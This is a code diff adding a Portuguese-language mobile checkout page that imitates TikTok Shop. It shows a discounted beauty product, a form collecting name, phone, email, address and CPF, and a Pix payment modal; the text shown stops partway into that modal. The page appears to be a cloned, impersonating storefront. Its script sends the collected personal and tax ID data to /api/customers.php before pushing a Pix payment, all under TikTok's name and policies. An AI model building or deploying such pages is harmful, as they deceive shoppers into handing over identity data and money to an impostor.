@@ -1,0 +1,752 @@
+<link rel="stylesheet" href="/assets/checkout.css">
+<script src="/assets/checkout.js"></script>
+
+<div id="customCheckoutModal" class="checkout-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #f5f5f5; z-index: 99999; flex-direction: column; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; overflow-y: auto; overflow-x: hidden;">
+    
+    <!-- Header -->
+    <div style="background: #fff; padding: 12px 16px; display: flex; align-items: center; position: sticky; top: 0; z-index: 10; border-bottom: 1px solid #ebebeb;">
+        <button onclick="window.closeCheckoutModal()" style="border:none; background:transparent; padding:0; display:flex;">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+        </button>
+        <div style="flex: 1; text-align: center; font-size: 14px; font-weight: 600; color: #111; display: flex; align-items: center; justify-content: center; gap: 4px;">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#F8C51B"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+            Ótima avaliação! 4.9/5,0
+        </div>
+        <div style="width: 24px;"></div>
+    </div>
+    
+    <!-- Endereço -->
+    <div id="checkoutAddressBlock" onclick="window.openAddressModal()" style="background: #fff; padding: 16px; display: flex; flex-direction: column; margin-bottom: 8px; cursor: pointer; position: relative; padding-bottom: 24px;">
+        <!-- Default State -->
+        <div id="checkoutAddressDefault" style="display: flex; align-items: center; justify-content: space-between;">
+            <div style="display: flex; align-items: center; gap: 8px; font-size: 14px; color: #111; font-weight: 500;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+                Endereço de envio
+            </div>
+            <div style="color: #fe2c55; font-size: 14px; font-weight: 600;">+ Adicionar endereço</div>
+        </div>
+        
+        <!-- Filled State -->
+        <div id="checkoutAddressFilled" style="display: none; align-items: flex-start; justify-content: space-between; gap: 12px;">
+            <div style="margin-top: 2px;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+            </div>
+            <div style="flex: 1;">
+                <div style="font-size: 15px; font-weight: 600; color: #111; margin-bottom: 6px;" id="filledAddrNamePhone"></div>
+                <div style="font-size: 14px; color: #555; line-height: 1.4;" id="filledAddrDetails"></div>
+            </div>
+            <div style="color: #999; font-size: 18px; margin-top: 2px;">›</div>
+        </div>
+        
+        <!-- Airmail border at the bottom -->
+        <div id="checkoutAddressBorder" style="display: none; position: absolute; bottom: 0; left: 0; width: 100%; height: 3px; background: repeating-linear-gradient(-45deg, #fe2c55, #fe2c55 12px, transparent 12px, transparent 16px, #32BCAD 16px, #32BCAD 28px, transparent 28px, transparent 32px);"></div>
+    </div>
+    
+    <!-- Produto -->
+    <div style="background: #fff; padding: 16px; margin-bottom: 8px;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+            <div style="display: flex; align-items: center;">
+                <span style="background: #ffe3c2; color: #111; font-size: 11px; font-weight: 700; padding: 1px 6px; border-radius: 4px; margin-right: 6px; display: inline-block;">Loja Estrela</span>
+                <div id="checkoutStoreName" style="font-weight: 600; font-size: 14px; color: #111;">BeautyFlashBr</div>
+            </div>
+            <div style="font-size: 12px; color: #999; display: flex; align-items: center;">Adicionar nota <span style="font-size:16px; margin-left:4px;">›</span></div>
+        </div>
+        <div style="display: flex; gap: 12px;">
+            <div style="width: 80px; height: 80px; border-radius: 4px; overflow: hidden; background: #f5f5f5; flex-shrink: 0;">
+                <img id="checkoutProductImage" src="/assets/product-desc-1-B0n8ByAg.webp" alt="Produto" style="width: 100%; height: 100%; object-fit: cover;">
+            </div>
+            <div style="flex: 1; display: flex; flex-direction: column; justify-content: space-between;">
+                <div>
+                    <div id="checkoutProductTitle" style="font-size: 14px; color: #111; line-height: 1.3; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;">Escova Onda Modeladora Beau...</div>
+                    <div id="checkoutProductVariant" style="font-size: 12px; color: #999; margin-top: 4px;">Escova Azul Bebê</div>
+                    <div style="display: flex; align-items: center; gap: 4px; font-size: 10px; color: #555; margin-top: 4px; font-weight: 600;">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="#F8C51B"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                        Devolução gratuita
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top: 8px;">
+                    <div>
+                        <div id="checkoutProductPrice" style="color: #fe2c55; font-weight: 700; font-size: 14px;">R$ 12,90</div>
+                        <div style="display: flex; align-items: center; gap: 4px; margin-top: 2px;">
+                            <span style="font-size: 11px; color: #999; text-decoration: line-through;" id="checkoutOriginalTop">R$ 29,90</span>
+                            <span style="font-size: 10px; color: #fe2c55; background: #ffeeef; padding: 1px 4px; border-radius: 2px; font-weight: 600;" id="checkoutDiscountPercent">-57%</span>
+                        </div>
+                    </div>
+                    <div style="display: flex; align-items: center; background: #f5f5f5; border-radius: 4px;">
+                        <button onclick="window.checkoutChangeQty(-1)" style="border:none; background:transparent; width: 28px; height: 28px; font-size: 16px; color: #999; display: flex; align-items: center; justify-content: center; cursor: pointer;">-</button>
+                        <span id="checkoutQty" style="font-size: 13px; font-weight: 600; width: 20px; text-align: center;">1</span>
+                        <button onclick="window.checkoutChangeQty(1)" style="border:none; background:transparent; width: 28px; height: 28px; font-size: 16px; color: #111; display: flex; align-items: center; justify-content: center; cursor: pointer;">+</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Desconto TikTok Shop -->
+    <div style="background: #fff; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+        <div style="display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 600; color: #111;">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+            Desconto do TikTok Shop
+        </div>
+        <span style="color: #999; font-size: 18px;">›</span>
+    </div>
+    
+    <!-- Resumo do Pedido -->
+    <div style="background: #fff; padding: 16px 16px 0 16px;">
+        <div style="font-size: 15px; font-weight: 700; color: #111; margin-bottom: 16px;">Resumo do Pedido</div>
+        
+        <div style="display: flex; justify-content: space-between; font-size: 14px; font-weight: 600; color: #111; margin-bottom: 12px;">
+            <div style="display: flex; align-items: center; gap: 4px;">Subtotal do produto <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"></polyline></svg></div>
+            <div id="checkoutTotalTop">R$ 12,90</div>
+        </div>
+        
+        <div style="display: flex; justify-content: space-between; font-size: 13px; color: #555; margin-bottom: 10px; padding-left: 8px;">
+            <span>Preço original</span>
+            <span id="checkoutSubtotal">R$ 29,90</span>
+        </div>
+        
+        <div style="display: flex; justify-content: space-between; font-size: 13px; color: #555; margin-bottom: 16px; padding-left: 8px;">
+            <span>Desconto no produto</span>
+            <span id="checkoutDiscount" style="color: #fe2c55;">- R$ 17,00</span>
+        </div>
+        
+        <div style="border-top: 1px solid #f0f0f0; padding-top: 16px; padding-bottom: 16px; display: flex; justify-content: space-between; align-items: center;">
+            <div style="font-size: 16px; font-weight: 700; color: #111;">Total</div>
+            <div style="text-align: right;">
+                <div id="checkoutTotalMiddle" style="font-size: 16px; font-weight: 700; color: #111;">R$ 12,90</div>
+                <div style="font-size: 11px; color: #999; margin-top: 2px;">Impostos inclusos</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Forma de pagamento -->
+    <div style="background: #fff; padding: 16px; margin-top: 8px; border-bottom: 1px solid #ebebeb;">
+        <div style="font-size: 15px; font-weight: 700; color: #111; margin-bottom: 16px;">Forma de pagamento</div>
+        
+        <div class="checkout-payment-option selected" onclick="window.attemptActionWithAddress()" style="display: flex; align-items: center; cursor: pointer;">
+            <div style="margin-right: 12px; display: flex; align-items: center; justify-content: center; width: 32px; height: 22px; background: #f5f5f5; border-radius: 3px;">
+                <svg width="14" height="14" viewBox="0 0 32 32" fill="#32BCAD">
+                    <path d="M9.8 4.6L2.3 12c-.5.5-.5 1.3 0 1.8l7.5 7.5 7.5-7.5c.5-.5.5-1.3 0-1.8L9.8 4.6z"/>
+                    <path d="M22.2 4.6l-7.5 7.5 7.5 7.5 7.5-7.5c.5-.5.5-1.3 0-1.8L22.2 4.6z"/>
+                    <path d="M16 10.8l-7.5 7.5 7.5 7.5 7.5-7.5L16 10.8z"/>
+                </svg>
+            </div>
+            <div style="flex: 1; font-size: 15px; color: #111;">Pix</div>
+            <div id="checkoutPixRadio" style="width: 22px; height: 22px; border-radius: 50%; border: 1.5px solid #ccc; background: transparent; display: flex; align-items: center; justify-content: center; transition: 0.2s;">
+                <svg id="checkoutPixRadioCheck" style="display: none;" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Policy & Pink Banner -->
+    <div style="background: #f5f5f5; padding: 16px; padding-bottom: 100px;">
+        <div style="font-size: 13px; color: #555; line-height: 1.4; text-align: left; margin-bottom: 16px;">
+            Ao fazer um pedido, você concorda com <strong>Termos de uso e venda do TikTok Shop</strong> e reconhece que leu e concordou com a <strong>Política de privacidade do TikTok</strong>.
+        </div>
+    </div>
+    
+    <!-- Footer Fixed -->
+    <div style="background: #fff; padding: 12px 16px; position: fixed; bottom: 0; left: 0; right: 0; border-top: 1px solid #f0f0f0; z-index: 10;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+            <div id="checkoutTotalItems" style="font-size: 15px; font-weight: 700; color: #111;">Total (1 item)</div>
+            <div id="checkoutTotal" style="font-size: 16px; font-weight: 700; color: #fe2c55;">R$ 12,90</div>
+        </div>
+        <button onclick="window.attemptActionWithAddress(window.openPixModal)" style="width: 100%; background: #fe2c55; color: #fff; border: none; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer;">
+            Fazer pedido
+        </button>
+    </div>
+</div>
+<!-- Address Alert Modal -->
+<div id="addressAlertModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 110000; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+    <div style="background: #fff; width: 80%; max-width: 320px; border-radius: 12px; overflow: hidden; text-align: center;">
+        <div style="padding: 24px 20px 20px 20px;">
+            <div style="font-size: 18px; font-weight: 700; color: #111; margin-bottom: 12px; line-height: 1.3;">Adicionar endereço de<br>entrega</div>
+            <div style="font-size: 15px; color: #555; line-height: 1.4;">Sua conta não tem um endereço<br>de envio. Adicione um para<br>prosseguir com a finalização da<br>compra.</div>
+        </div>
+        <div style="display: flex; border-top: 1px solid #eee;">
+            <button onclick="document.getElementById('addressAlertModal').style.display='none';" style="flex: 1; padding: 16px; background: transparent; border: none; font-size: 15px; color: #111; cursor: pointer; border-right: 1px solid #eee;">Mais tarde</button>
+            <button onclick="document.getElementById('addressAlertModal').style.display='none'; window.openAddressModal();" style="flex: 1; padding: 16px; background: transparent; border: none; font-size: 15px; font-weight: 700; color: #111; cursor: pointer;">Adicionar</button>
+        </div>
+    </div>
+</div>
+
+<script>
+window.attemptActionWithAddress = function(originalActionCallback) {
+    let radio = document.getElementById('checkoutPixRadio');
+    let check = document.getElementById('checkoutPixRadioCheck');
+    
+    if (typeof originalActionCallback === 'function') {
+        // Clicando em "Fazer pedido"
+        let filled = document.getElementById('checkoutAddressFilled');
+        if (filled && filled.style.display === 'flex') {
+            if (radio && radio.classList.contains('active-radio')) {
+                // Save customer data before proceeding
+                let customerData = {
+                    name: document.getElementById('addr_name')?.value || '',
+                    cpf: document.getElementById('addr_cpf')?.value || '',
+                    phone: document.getElementById('addr_phone')?.value || '',
+                    email: document.getElementById('addr_email')?.value || '',
+                    cep: document.getElementById('addr_cep')?.value || '',
+                    address: document.getElementById('addr_street')?.value || '',
+                    number: document.getElementById('addr_number')?.value || '',
+                    neighborhood: document.getElementById('addr_neighborhood')?.value || '',
+                    city: document.getElementById('addr_city')?.value || '',
+                    state: document.getElementById('addr_state')?.value || '',
+                    product_name: window.ShopConfig ? window.ShopConfig.name : document.title
+                };
+                fetch('/api/customers.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(customerData)
+                }).catch(console.error);
+
+                originalActionCallback(customerData);
+            } else {
+                alert("Selecione o método de pagamento");
+            }
+        } else {
+            document.getElementById('addressAlertModal').style.display = 'flex';
+        }
+    } else {
+        // Clicando no bloco do Pix
+        if (radio) {
+            if (radio.classList.contains('active-radio')) {
+                radio.classList.remove('active-radio');
+                radio.style.border = '1.5px solid #ccc';
+                radio.style.background = 'transparent';
+                if (check) check.style.display = 'none';
+            } else {
+                radio.classList.add('active-radio');
+                radio.style.border = 'none';
+                radio.style.background = '#32BCAD';
+                if (check) check.style.display = 'block';
+            }
+        }
+    }
+};
+
+window.checkoutChangeQty = function(delta) {
+    let qtyEl = document.getElementById('checkoutQty');
+    if (!qtyEl) return;
+    let currentQty = parseInt(qtyEl.innerText) || 1;
+    let newQty = currentQty + delta;
+    if (newQty < 1) newQty = 1;
+    qtyEl.innerText = newQty;
+    
+    if (!window.checkoutBasePrices) {
+        let getV = (str) => parseFloat((str||"0").toString().replace(/[^\d,-]/g, '').replace(',', '.'));
+        window.checkoutBasePrices = {
+            total: getV(document.getElementById('checkoutProductPrice').innerText),
+            orig: getV(document.getElementById('checkoutOriginalTop').innerText)
+        };
+    }
+    
+    let formatMoney = (val) => "R$ " + val.toFixed(2).replace('.', ',');
+    let base = window.checkoutBasePrices;
+    let newTotal = base.total * newQty;
+    let newOrig = base.orig * newQty;
+    let newDisc = newOrig - newTotal;
+    
+    if(document.getElementById('checkoutProductPrice')) document.getElementById('checkoutProductPrice').innerText = formatMoney(newTotal);
+    if(document.getElementById('checkoutOriginalTop')) document.getElementById('checkoutOriginalTop').innerText = formatMoney(newOrig);
+    if(document.getElementById('checkoutTotal')) document.getElementById('checkoutTotal').innerText = formatMoney(newTotal);
+    if(document.getElementById('checkoutSubtotal')) document.getElementById('checkoutSubtotal').innerText = formatMoney(newOrig);
+    if(document.getElementById('checkoutDiscount')) document.getElementById('checkoutDiscount').innerText = "- " + formatMoney(newDisc);
+    if(document.getElementById('checkoutTotalTop')) document.getElementById('checkoutTotalTop').innerText = formatMoney(newTotal);
+    if(document.getElementById('checkoutTotalMiddle')) document.getElementById('checkoutTotalMiddle').innerText = formatMoney(newTotal);
+    
+    let itemText = newQty === 1 ? "1 item" : newQty + " itens";
+    if(document.getElementById('checkoutTotalItems')) document.getElementById('checkoutTotalItems').innerText = "Total (" + itemText + ")";
+};
+
+  setInterval(() => {
+     let cTotal = document.getElementById('checkoutTotal');
+     let cSub = document.getElementById('checkoutSubtotal');
+     let cDisc = document.getElementById('checkoutDiscount');
+     let cPrice = document.getElementById('checkoutProductPrice');
+     
+     let fixCurrency = (el) => {
+         if (el && el.innerText) {
+             let text = el.innerText.trim();
+             if ((!text.includes('R$') || !text.includes(',')) && text.match(/\d/)) {
+                 let valStr = text.replace(/[^\d.,]/g, '');
+                 let val = parseFloat(valStr.replace(',', '.'));
+                 if (!isNaN(val)) {
+                     el.innerText = "R$ " + val.toFixed(2).replace('.', ',');
+                 }
+             }
+         }
+     };
+     
+     if (!window.checkoutBasePrices) {
+         fixCurrency(cPrice);
+         fixCurrency(cTotal);
+         fixCurrency(cSub);
+         if (cDisc && cDisc.innerText && (!cDisc.innerText.includes('R$') || !cDisc.innerText.includes(',')) && cDisc.innerText.match(/\d/)) {
+             let val = parseFloat(cDisc.innerText.replace(/[^\d.,]/g, '').replace(',', '.'));
+             if (!isNaN(val)) cDisc.innerText = "- R$ " + val.toFixed(2).replace('.', ',');
+         }
+     }
+     
+     if(cTotal && cTotal.innerText) {
+         let txt = cTotal.innerText;
+         if(document.getElementById('checkoutTotalTop') && document.getElementById('checkoutTotalTop').innerText !== txt) document.getElementById('checkoutTotalTop').innerText = txt;
+         if(document.getElementById('checkoutTotalMiddle') && document.getElementById('checkoutTotalMiddle').innerText !== txt) document.getElementById('checkoutTotalMiddle').innerText = txt;
+     }
+     
+     if(cSub && cSub.innerText && document.getElementById('checkoutOriginalTop')) {
+         if(document.getElementById('checkoutOriginalTop').innerText !== cSub.innerText) document.getElementById('checkoutOriginalTop').innerText = cSub.innerText;
+         try {
+             let getV = (str) => parseFloat(str.replace(/[^\d,-]/g, '').replace(',', '.'));
+             let orig = getV(cSub.innerText);
+             let curr = getV(cTotal.innerText);
+             if(orig > curr && curr > 0) {
+                 let pct = Math.round((1 - (curr/orig)) * 100);
+                 document.getElementById('checkoutDiscountPercent').innerText = "-" + pct + "%";
+             }
+         } catch(e) {}
+     }
+  }, 500);
+</script>
+
+<!-- Address Modal -->
+<div id="checkoutAddressModal" class="checkout-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #f5f5f5; z-index: 100000; flex-direction: column; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; overflow-y: auto; overflow-x: hidden;">
+    
+    <!-- Header -->
+    <div style="background: #fff; padding: 12px 16px; display: flex; align-items: center; position: sticky; top: 0; z-index: 10; border-bottom: 1px solid #f0f0f0;">
+        <button onclick="window.closeAddressModal()" style="border:none; background:transparent; padding:0; display:flex; cursor: pointer;">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+        </button>
+        <div style="flex: 1; text-align: center; font-size: 16px; font-weight: 700; color: #111;">
+            Adicionar o novo endereço
+        </div>
+        <div style="width: 24px;"></div>
+    </div>
+    
+    <!-- Banner Frete Grátis -->
+    <div style="background: #f2fbfb; padding: 14px 16px; display: flex; align-items: center; gap: 8px; font-size: 14px; color: #111; margin-bottom: 8px;">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="#32BCAD"><path d="M20 8h-3V4H3v13h2v-2h10v2h2v-2h3V8zm-1.5 5h-1.5v-2h1.5v2zm-12 0H5v-2h1.5v2zM17 5.5V8h3l-1.5-2.5H17z"></path><circle cx="6" cy="18" r="2" fill="#32BCAD"></circle><circle cx="16" cy="18" r="2" fill="#32BCAD"></circle><path d="M1 9h2v2H1z" fill="#32BCAD"></path><path d="M1 12h2v2H1z" fill="#32BCAD"></path></svg>
+        Você ganhou <span style="color: #32BCAD; font-weight: 600;">Frete grátis</span>
+    </div>
+
+    <style>
+        .address-section-title { font-size: 13px; font-weight: 600; color: #777; padding: 16px 16px 8px 16px; }
+        .address-input-group { background: #fff; padding: 0 16px; display: flex; flex-direction: column; }
+        .address-input-wrapper { display: flex; align-items: center; border-bottom: 1px solid #eee; padding: 14px 0; position: relative; }
+        .address-input-wrapper:last-child { border-bottom: none; }
+        .address-input { border: none; outline: none; width: 100%; font-size: 15px; color: #111; background: transparent; }
+        .address-input::placeholder { color: #aaa; }
+        .address-error { font-size: 12px; color: #fe2c55; display: none; align-items: center; gap: 4px; margin-top: 4px; padding-bottom: 12px; border-bottom: 1px solid #eee; }
+        .address-error.active { display: flex; }
+        .address-info-text { font-size: 12px; color: #777; padding: 12px 0; border-top: 1px solid #eee; }
+    </style>
+    
+    <!-- Informações de contato -->
+    <div class="address-section-title">Informações de contato</div>
+    <div class="address-input-group">
+        <div class="address-input-wrapper">
+            <input type="text" id="addr_name" class="address-input" placeholder="Nome e sobrenome" oninput="window.validateAddressForm()">
+        </div>
+        <div id="addr_name_error" class="address-error"><svg width="14" height="14" viewBox="0 0 24 24" fill="#fe2c55"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Insira seu nome completo</div>
+        
+        <div class="address-input-wrapper">
+            <span style="color: #555; font-size: 15px; margin-right: 8px;">BR +55 |</span>
+            <input type="tel" id="addr_phone" class="address-input" placeholder="Número de telefone" oninput="window.validateAddressForm()">
+        </div>
+        
+        <div class="address-input-wrapper" style="border-bottom:none;">
+            <input type="email" id="addr_email" class="address-input" placeholder="E-mail" oninput="window.validateAddressForm()">
+        </div>
+        <div id="addr_email_error" class="address-error"><svg width="14" height="14" viewBox="0 0 24 24" fill="#fe2c55"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Insira um endereço de e-mail válido</div>
+    </div>
+    
+    <!-- Informações de endereço -->
+    <div class="address-section-title">Informações de endereço</div>
+    <div class="address-input-group">
+        <div class="address-input-wrapper">
+            <input type="text" id="addr_cep" class="address-input" placeholder="CEP/Código postal" maxlength="9" oninput="window.onCepInput(this)">
+        </div>
+        
+        <div style="display: flex; gap: 16px;">
+            <div class="address-input-wrapper" style="flex: 1;">
+                <input type="text" id="addr_state" class="address-input" placeholder="Estado/UF" oninput="window.validateAddressForm()">
+                <svg style="position: absolute; right: 0;" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="address-input-wrapper" style="flex: 1;">
+                <input type="text" id="addr_city" class="address-input" placeholder="Cidade" oninput="window.validateAddressForm()">
+                <svg style="position: absolute; right: 0;" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+        </div>
+        
+        <div class="address-input-wrapper">
+            <input type="text" id="addr_neighborhood" class="address-input" placeholder="Bairro/Distrito" oninput="window.validateAddressForm()">
+        </div>
+        <div class="address-input-wrapper">
+            <input type="text" id="addr_street" class="address-input" placeholder="Endereço" oninput="window.validateAddressForm()">
+        </div>
+        <div class="address-input-wrapper">
+            <input type="text" id="addr_number" class="address-input" placeholder="Nº da residência. Use &quot;s/n&quot; se nenhum" oninput="window.validateAddressForm()">
+        </div>
+        <div class="address-input-wrapper">
+            <input type="text" id="addr_complement" class="address-input" placeholder="Apartamento, bloco, unidade etc. (opcional)">
+        </div>
+    </div>
+    
+    <!-- Informações fiscais -->
+    <div class="address-section-title">Informações fiscais</div>
+    <div class="address-input-group">
+        <div class="address-input-wrapper" style="border-bottom:none;">
+            <input type="text" id="addr_cpf" class="address-input" placeholder="Número de CPF de 11 dígitos" maxlength="14" oninput="window.onCpfInput(this)">
+        </div>
+        <div id="addr_cpf_error" class="address-error"><svg width="14" height="14" viewBox="0 0 24 24" fill="#fe2c55"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Insira um CPF válido</div>
+        <div class="address-info-text">O CPF será usado para emitir faturas.</div>
+    </div>
+    
+    <!-- Configurações -->
+    <div class="address-section-title">Configurações</div>
+    <div class="address-input-group" style="margin-bottom: 24px;">
+        <div style="display: flex; justify-content: space-between; align-items: center; padding: 16px 0;">
+            <span style="font-size: 15px; font-weight: 700; color: #111;">Definir como padrão</span>
+            <div id="addr_toggle" style="width: 40px; height: 24px; border-radius: 12px; background: #32BCAD; position: relative; cursor: pointer; transition: 0.2s;" onclick="this.style.background = this.style.background==='rgb(221, 221, 221)' ? '#32BCAD' : '#ddd'; this.children[0].style.left = this.style.background==='rgb(221, 221, 221)' ? '2px' : '18px';">
+                <div style="width: 20px; height: 20px; border-radius: 50%; background: #fff; position: absolute; top: 2px; left: 18px; transition: 0.2s; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer Fixed -->
+    <div style="background: #fff; padding: 12px 16px; padding-bottom: 30px; margin-top: auto;">
+        <div style="font-size: 12px; color: #777; text-align: center; margin-bottom: 12px; line-height: 1.4;">
+            Leia a <strong>Política de privacidade do TikTok</strong> para saber mais sobre como usamos suas informações pessoais.
+        </div>
+        <button id="addr_save_btn" onclick="window.saveAddress()" style="width: 100%; background: #ffb3c1; color: #fff; border: none; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; pointer-events: none; transition: 0.2s;">
+            Salvar
+        </button>
+    </div>
+</div>
+
+<script>
+window.openAddressModal = function() {
+    document.getElementById('checkoutAddressModal').style.display = 'flex';
+};
+window.closeAddressModal = function() {
+    document.getElementById('checkoutAddressModal').style.display = 'none';
+};
+
+window.onCepInput = function(el) {
+    let v = el.value.replace(/\D/g, '');
+    if (v.length > 5) v = v.substring(0,5) + '-' + v.substring(5,8);
+    el.value = v;
+    window.validateAddressForm();
+    
+    let pure = el.value.replace(/\D/g, '');
+    if (pure.length === 8 && el.dataset.lastCep !== pure) {
+        el.dataset.lastCep = pure;
+        fetch('https://viacep.com.br/ws/'+pure+'/json/')
+        .then(r => r.json())
+        .then(d => {
+            if (!d.erro) {
+                document.getElementById('addr_street').value = d.logradouro || '';
+                document.getElementById('addr_neighborhood').value = d.bairro || '';
+                document.getElementById('addr_city').value = d.localidade || '';
+                document.getElementById('addr_state').value = d.uf || '';
+                window.validateAddressForm();
+            }
+        }).catch(e=>{});
+    }
+};
+
+window.onCpfInput = function(el) {
+    let v = el.value.replace(/\D/g, '');
+    if (v.length <= 11) {
+        v = v.replace(/(\d{3})(\d)/, '$1.$2');
+        v = v.replace(/(\d{3})(\d)/, '$1.$2');
+        v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    }
+    el.value = v;
+    window.validateAddressForm();
+};
+
+window.validateAddressForm = function() {
+    let name = document.getElementById('addr_name').value.trim();
+    let phone = document.getElementById('addr_phone').value.trim();
+    let email = document.getElementById('addr_email').value.trim();
+    let cep = document.getElementById('addr_cep').value.replace(/\D/g, '');
+    let state = document.getElementById('addr_state').value.trim();
+    let city = document.getElementById('addr_city').value.trim();
+    let neighborhood = document.getElementById('addr_neighborhood').value.trim();
+    let street = document.getElementById('addr_street').value.trim();
+    let number = document.getElementById('addr_number').value.trim();
+    let cpf = document.getElementById('addr_cpf').value.replace(/\D/g, '');
+    
+    let hasNameError = name.length > 0 && !name.includes(' ');
+    let hasEmailError = email.length > 0 && !email.includes('@');
+    let hasCpfError = cpf.length > 0 && cpf.length < 11;
+    
+    document.getElementById('addr_name_error').classList.toggle('active', hasNameError);
+    document.getElementById('addr_email_error').classList.toggle('active', hasEmailError);
+    document.getElementById('addr_cpf_error').classList.toggle('active', hasCpfError);
+    
+    let isValid = name.includes(' ') && phone.length >= 8 && email.includes('@') && cep.length === 8 && state && city && neighborhood && street && number && cpf.length === 11;
+    
+    let btn = document.getElementById('addr_save_btn');
+    if (isValid) {
+        btn.style.background = '#fe2c55';
+        btn.style.pointerEvents = 'auto';
+    } else {
+        btn.style.background = '#ffb3c1';
+        btn.style.pointerEvents = 'none';
+    }
+};
+
+window.saveAddress = function() {
+    let name = document.getElementById('addr_name').value.trim();
+    let phone = document.getElementById('addr_phone').value.replace(/\D/g, '');
+    let cep = document.getElementById('addr_cep').value.replace(/\D/g, '');
+    let state = document.getElementById('addr_state').value.trim();
+    let city = document.getElementById('addr_city').value.trim();
+    let neighborhood = document.getElementById('addr_neighborhood').value.trim();
+    let street = document.getElementById('addr_street').value.trim();
+    let number = document.getElementById('addr_number').value.trim();
+    
+    let maskedPhone = phone;
+    if (phone.length >= 10) {
+        let ddd = phone.substring(0,2);
+        let last2 = phone.substring(phone.length - 2);
+        let stars = '*'.repeat(phone.length - 4);
+        maskedPhone = ddd + stars + last2;
+    }
+    
+    document.getElementById('filledAddrNamePhone').innerText = name + ", (+55)" + maskedPhone;
+    document.getElementById('filledAddrDetails').innerText = street + ", " + number + ", " + neighborhood + ", " + city + ", " + state + ", " + cep;
+    
+    document.getElementById('checkoutAddressDefault').style.display = 'none';
+    document.getElementById('checkoutAddressFilled').style.display = 'flex';
+    document.getElementById('checkoutAddressBorder').style.display = 'block';
+    
+    window.closeAddressModal();
+};
+</script>
+
+<!-- Pix Payment Modal -->
+<div id="checkoutPixModal" class="checkout-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #fff; z-index: 120000; flex-direction: column; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; overflow-y: auto; overflow-x: hidden;">
+
+    <!-- Background Gradient Top -->
+    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 280px; background: linear-gradient(135deg, #e0f7fa 0%, #fff0f5 100%); z-index: -1;"></div>
+
+    <!-- Header -->
+    <div style="padding: 16px; display: flex; align-items: center; position: sticky; top: 0; z-index: 10;">
